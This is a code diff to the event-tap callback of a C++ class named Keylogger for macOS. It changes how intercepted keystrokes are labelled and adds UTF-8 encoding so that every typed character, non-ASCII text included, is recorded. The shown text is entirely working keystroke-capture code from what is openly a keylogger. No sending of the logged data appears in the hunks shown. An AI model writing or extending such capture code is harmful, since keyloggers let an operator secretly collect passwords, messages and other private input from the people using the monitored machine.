@@ -24,30 +24,26 @@ CGEventRef Keylogger::CGEventCallback(CGEventTapProxy proxy, CGEventType type, C
     // Lấy mã phím ảo
     CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-    // Xử lý các phím đặc biệt (Command, Shift, Caplock...)
-    if (keyCode == kVK_Return) append("\n");
+    if (keyCode == kVK_Return) append("[RETURN]");
     else if (keyCode == kVK_Tab) append("[TAB]");
     else if (keyCode == kVK_Space) append(" ");
-    else if (keyCode == kVK_Delete) append("[BACK]");
+    else if (keyCode == kVK_Delete) append("[DELETE]");
     else if (keyCode == kVK_ForwardDelete) append("[DEL]");
     else if (keyCode == kVK_Escape) append("[ESC]");
     else if (keyCode == kVK_Command || keyCode == kVK_RightCommand) append("[CMD]");
-    else if (keyCode == kVK_Shift || keyCode == kVK_RightShift) { /* Bỏ qua shift */ }
+    else if (keyCode == kVK_Shift || keyCode == kVK_RightShift) append("[SHIFT]");
     else if (keyCode == kVK_CapsLock) append("[CAPS]");
     else if (keyCode == kVK_Option || keyCode == kVK_RightOption) append("[OPT]");
     else if (keyCode == kVK_Control || keyCode == kVK_RightControl) append("[CTRL]");
-    // Các phím mũi tên
     else if (keyCode == kVK_LeftArrow) append("[LEFT]");
     else if (keyCode == kVK_RightArrow) append("[RIGHT]");
     else if (keyCode == kVK_UpArrow) append("[UP]");
     else if (keyCode == kVK_DownArrow) append("[DOWN]");
-    // Các phím chức năng
     else if (keyCode == kVK_Home) append("[HOME]");
     else if (keyCode == kVK_End) append("[END]");
     else if (keyCode == kVK_PageUp) append("[PGUP]");
     else if (keyCode == kVK_PageDown) append("[PGDN]");
-    else if (keyCode == kVK_Help) append("[INS]"); // Help key trên Mac thường map với Insert
-    // Các phím F1-F12
+    else if (keyCode == kVK_Help) append("[INS]");
     else if (keyCode == kVK_F1) append("[F1]");
     else if (keyCode == kVK_F2) append("[F2]");
     else if (keyCode == kVK_F3) append("[F3]");
@@ -60,25 +56,29 @@ CGEventRef Keylogger::CGEventCallback(CGEventTapProxy proxy, CGEventType type, C
     else if (keyCode == kVK_F10) append("[F10]");
     else if (keyCode == kVK_F11) append("[F11]");
     else if (keyCode == kVK_F12) append("[F12]");
-    // Các phím khác
-    else if (keyCode == kVK_F13) append("[F13]"); // Print Screen trên một số Mac
-    else if (keyCode == kVK_F14) append("[F14]"); // Scroll Lock trên một số Mac
-    else if (keyCode == kVK_F15) append("[F15]"); // Pause trên một số Mac
+    else if (keyCode == kVK_F13) append("[F13]");
+    else if (keyCode == kVK_F14) append("[F14]");
+    else if (keyCode == kVK_F15) append("[F15]");
     else if (keyCode == kVK_ANSI_KeypadClear) append("[NUMLOCK]");
     else {
-        // Chuyển mã phím thành ký tự Unicode (UTF-8)
         UniChar unicodeString[4];
         UniCharCount actualStringLength = 0;
         
         CGEventKeyboardGetUnicodeString(event, 4, &actualStringLength, unicodeString);
         
         if (actualStringLength > 0) {
-            // Convert UniChar (UTF-16) sang std::string (UTF-8) đơn giản
             std::string s;
             for (int i = 0; i < actualStringLength; ++i) {
-                // Lọc ký tự in được (ASCII cơ bản)
-                if (unicodeString[i] >= 32 && unicodeString[i] <= 126) {
-                    s += (char)unicodeString[i];
+                UniChar uc = unicodeString[i];
+                if (uc < 0x80) {
+                    s += (char)uc;
+                } else if (uc < 0x800) {
+                    s += (char)(0xC0 | (uc >> 6));
+                    s += (char)(0x80 | (uc & 0x3F));
+                } else {
+                    s += (char)(0xE0 | (uc >> 12));
+                    s += (char)(0x80 | ((uc >> 6) & 0x3F));
+                    s += (char)(0x80 | (uc & 0x3F));
                 }
             }
             if (!s.empty()) {
